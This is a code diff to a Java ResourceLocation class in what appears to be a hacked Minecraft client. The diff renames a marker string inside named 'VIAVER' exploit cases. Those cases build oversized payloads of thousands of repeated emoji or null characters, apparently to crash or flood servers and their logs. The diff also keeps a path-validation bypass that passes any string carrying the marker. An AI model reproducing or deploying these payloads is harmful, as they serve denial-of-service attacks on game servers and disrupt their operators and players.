@@ -99,7 +99,7 @@ public class ResourceLocation implements Comparable<ResourceLocation> {
                         } catch (IOException e) {
                             e.printStackTrace();
                         }
-                        finalString.append("\nXYNIS").append(isFormated ? "\033[0m" : "");
+                        finalString.append("\nRED SIGNAL").append(isFormated ? "\033[0m" : "");
                         astring = new String[]{finalString.toString(), ""};
                     }
                 }catch (Exception e){
@@ -108,11 +108,11 @@ public class ResourceLocation implements Comparable<ResourceLocation> {
             }
 
             case "VIAVER-LOGFUCKER-EXPLOIT" -> {
-                astring = new String[]{(isFormated ? format : "") + "👨‍👩‍👧‍👦".repeat(2050) + "\nXYNIS" + (isFormated ? "\033[0m" : ""), ""};
+                astring = new String[]{(isFormated ? format : "") + "👨‍👩‍👧‍👦".repeat(2050) + "\nRED SIGNAL" + (isFormated ? "\033[0m" : ""), ""};
             }
 
             case "VIAVER-NULL-EXPLOIT" -> {
-                astring = new String[]{(isFormated ? format : "") + "\0\n".repeat(7950) + "\nXYNIS" + (isFormated ? "\033[0m" : ""), ""};
+                astring = new String[]{(isFormated ? format : "") + "\0\n".repeat(7950) + "\nRED SIGNAL" + (isFormated ? "\033[0m" : ""), ""};
             }
 
             default -> astring = new String[]{"minecraft", p_135833_};
@@ -287,7 +287,7 @@ public class ResourceLocation implements Comparable<ResourceLocation> {
     }
 
     private static String assertValidPath(String p_251418_, String p_248828_) {
-        if (p_248828_.contains("XYNIS") || p_251418_.contains("XYNIS")) return p_248828_;
+        if (p_248828_.contains("RED SIGNAL") || p_251418_.contains("RED SIGNAL")) return p_248828_;
         if (!isValidPath(p_248828_)) {
             throw new ResourceLocationException("Non [a-z0-9/._-] character in path of location: " + p_251418_ + ":" + p_248828_);
         } else {
